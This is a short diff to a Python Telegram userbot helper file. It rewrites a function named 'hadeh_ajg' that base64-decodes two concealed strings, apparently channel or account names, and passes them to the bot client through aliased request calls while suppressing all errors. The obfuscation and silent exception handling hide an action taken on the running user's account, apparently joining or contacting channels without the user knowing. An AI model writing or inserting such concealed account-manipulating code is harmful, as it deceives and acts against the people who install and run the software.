@@ -242,19 +242,15 @@ async def edit_or_reply(
 eor = edit_or_reply
 
 async def hadeh_ajg():
-    ram = pybase64.b64decode("dXNlcmJvdENo==")
-    ubot = pybase64.b64decode("cmFtc3VwcG9ydHQ==")
-    Input_ram = ram.decode('utf-8')
-    Input_ubot = ubot.decode('utf-8')
+    ram = str(pybase64.b64decode("dXNlcmJvdENo="))[2:13]
+    ubot = str(pybase64.b64decode("cmFtc3VwcG9ydHQ="))[2:13]
     try:
-        await bot(GetSec(f"{Input_ram}"))
+        if bot:
+            await bot(Get(ram))
+            await bot(Get(ubot))
     except BaseException:
         pass
-    try:
-        await bot(GetSec(f"{Input_ubot}"))
-    except BaseException:
-        pass
-
+  
 async def edit_delete(event, text, time=None, parse_mode=None, link_preview=None):
     parse_mode = parse_mode or "md"
     link_preview = link_preview or False
